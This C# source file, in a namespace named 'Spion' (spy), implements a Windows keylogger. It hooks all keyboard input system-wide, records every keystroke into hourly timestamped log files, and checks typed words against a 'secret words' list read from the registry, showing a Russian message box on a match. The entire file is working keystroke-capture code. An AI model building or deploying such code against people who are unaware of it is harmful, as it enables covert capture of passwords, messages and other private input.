using System;
using System.Collections.Generic;
using System.IO;
using System.Threading.Tasks;
using System.Windows.Forms;
using Gma.System.MouseKeyHook;
using Microsoft.Win32;
using static System.Console;

namespace Spion
{
    public class Listener
    {
        private string buffer = "";
        private int lastMinute;
        private int currentHour;
        private string file;
        private List<string> secreteWords;
        private bool isWord = true;
        private string word = "";
        public Listener()
        {
            currentHour = DateTime.Now.Hour;
            lastMinute = DateTime.Now.Minute;
            CheckCreateFile();
            var hook = Hook.GlobalEvents();
            hook.KeyPress += HookOnKeyPress;
        }
        private void HookOnKeyPress(object sender, KeyPressEventArgs e)
        {
            var minutes = DateTime.Now.Minute;
            var hours = DateTime.Now.Hour;
            if (currentHour == 23 && hours == 0 || hours > currentHour)
            {
                currentHour = hours;
                Task.Run(SaveLog);
            }
            else if (lastMinute == 59 && minutes == 0 || lastMinute < minutes)
            {
                
                lastMinute = minutes;
                Task.Run(SaveLog);
            }
            char chr = e.KeyChar;
            buffer += chr;

            if (chr == ' ')
            {
                isWord = false;
            }
            else
            {
                isWord = true;
            }

            if (isWord)
            {
                word += chr;
            }
            else
            {
                foreach(var w in secreteWords)
                {
                    if (word.Contains(w))
                    {
                        word = "";
                        MessageBox.Show("Вы ввели секретное слово!", "Поздравляю!", MessageBoxButtons.OK, MessageBoxIcon.Information);
                        break;
                    }
                }
                
            }
        }

        private void CheckCreateFile()
        {
            var words = (string[]) Registry.CurrentUser.CreateSubKey("KeySpion").GetValue("Words");
            secreteWords = new List<string>();
            foreach (var word in words)
            {
                secreteWords.Add(word);
            }
            var now = DateTime.Now;
            string path = $"{Directory.GetCurrentDirectory()}/logs/temp/{now.Year}_{now.Month}_{now.Day}_{now.Hour}.txt";
            if (!File.Exists(path))
            {
                file = path;
                File.Create(path).Close();
            }
        }
        private void SaveLog()
        {
            CheckCreateFile();
            var writer = new StreamWriter(file, true);
            writer.WriteAsync($"[{DateTime.Now.Hour}:{DateTime.Now.Minute}] ");
            writer.WriteLineAsync(buffer);
            writer.Close();
            buffer = "";
        }
    }
}